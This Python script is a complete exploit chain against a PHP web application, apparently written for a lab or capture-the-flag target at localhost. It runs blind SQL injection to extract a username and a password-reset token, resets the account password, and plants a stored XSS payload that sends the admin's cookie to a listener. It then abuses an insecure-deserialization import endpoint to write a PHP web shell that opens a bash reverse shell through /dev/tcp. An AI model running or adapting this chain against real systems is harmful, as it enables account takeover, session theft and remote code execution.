import base64
import socket
import sys
import requests
import string
import json
import random
import subprocess
import time

MAX_USERNAME_LENGTH = 30
ALPHANUM = string.ascii_letters + string.digits + '_'
URL = "http://localhost:8080"

def get_username_length():
    i = 1
    while i <= MAX_USERNAME_LENGTH:
        print(f"Trying for {i}")
        payload = f"' OR username=(SELECT username FROM users WHERE LENGTH(username)={i} ORDER BY username DESC LIMIT 1) --"
        data = {"username": payload}
        response = requests.post(URL + "/forgotusername.php", data=data)
        
        if "exists" in response.text.lower():
            print(f"Username length found: {i}")
            return i
        i += 1
    return i

def get_username(length):
    username = ""
    for pos in range(length):
        for char in ALPHANUM:
            payload = f"' OR username=(SELECT username FROM users WHERE LENGTH(username)={length} ORDER BY username DESC LIMIT 1) AND username LIKE '{username}{char}%' --"
            data = {"username": payload}
            response = requests.post(URL + "/forgotusername.php", data=data)
            
            if "exists" in response.text.lower():
                username += char
                print(f"Found character {pos + 1}: {char}")
                break

    print(f"Username discovered: {username}")
    return username
    
def reset_password(username, password):
    data = {"username": username}
    requests.post(URL + "/forgotpassword.php", data=data)
    token = get_token(username)
    data = {
        "token": token,
        "password1": password,
        "password2": password
    }
    response = requests.post(URL + "/resetpassword.php", data=data)
    if "changed" in response.text.lower():
        print(f"Password has been reset to {password}")
    else:
        print("Error: couldn't change password")

def get_token(username):
    token = ""
    for pos in range(32):
        for char in ALPHANUM:
            payload = f"{username}' and (SELECT token FROM users u, tokens t WHERE u.username='{username}' and u.uid=t.uid ORDER BY t.token DESC LIMIT 1) LIKE '{token}{char}%' --"
            data = {"username": payload}
            response = requests.post(URL + "/forgotusername.php", data=data)
            
            if "exists" in response.text.lower():
                token += char
                print(f"Found character {pos + 1}: {char}")
                break
    print(f"Token discovered: {token}")
    return token

def set_desc(session, d):
	d = {"description":d}
	r = session.post(URL + '/profile.php',data=d)
	return "Success" in r.text

def get_admin_session(host, lport, session):

    if set_desc(session, "<script>document.write('<img src=http://%s:%d/'+document.cookie+' />');</script>"%(host,lport)):
        print("[+] XSS payload set successfully.")
    else:
        print("[-] Failed to set XSS payload.")
        return

    print("[*] Setting up listener on port %d..."%lport)
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host,lport))
    s.listen()

    print("[*] Waiting for admin to trigger XSS...")
    (sock_c, ip_c) = s.accept()
    get_request = sock_c.recv(4096)
    admin_cookie = get_request.split(b" HTTP")[0][5:].decode("UTF-8")

    print("[+] Stole admin's cookie:")
    print("    -- " + admin_cookie) 
    return admin_cookie

def import_user(cookie, payload, target):
	c = {"PHPSESSID":cookie}
	d = {"userobj":payload}
	r = requests.post("%s/admin/import_user.php"%URL,data=d,cookies=c)

def code_injection(host, lport, session, cookie):
    evil = ''.join(random.choice(string.ascii_letters) for _ in range(10))

    f = "/var/www/html/%s.php"%evil
    c = "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\"); ?>"%(host,lport)
    c = base64.urlsafe_b64encode(c.encode("UTF-8")).decode("UTF-8")

    proc = subprocess.Popen(["python", "serialize.py", f, c], stdout=subprocess.PIPE)
    payload = proc.stdout.read()
    print("[+] Generated payload!")

    import_user(cookie, payload, host)
    print("[*] Sent import user request (%s.php)"%(evil))

    print("[*] Attempting to start reverse shell...")
    subprocess.Popen([
        "powershell",
        "-Command",
        f"$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, {lport}); $listener.Start(); $client = $listener.AcceptTcpClient();"
    ])
    time.sleep(1)
    requests.get("%s/%s.php"%(URL,evil))

    while True:
        pass

if __name__ == "__main__":

    file_path = "values.json"
    with open(file_path, "r") as f:
        data = json.load(f)

    if data["username"] == "":
        username_length = get_username_length()
        assert username_length <= MAX_USERNAME_LENGTH
        data["username"] = get_username(username_length)
        reset_password(data["username"], data["password"])
        with open(file_path, "w") as f:
            json.dump(data, f, indent=4)

    session = requests.Session()
    response = session.post(URL + "/login.php", data=data)

    #print(response.text)

    if "failed" in response.text.lower():
        print("Login failed")
    else:
        print("Logged in!")
        admin_cookie = get_admin_session("localhost", 8082, session)
        code_injection("localhost", 8083, session, admin_cookie)
        #TODO: get admin account
       
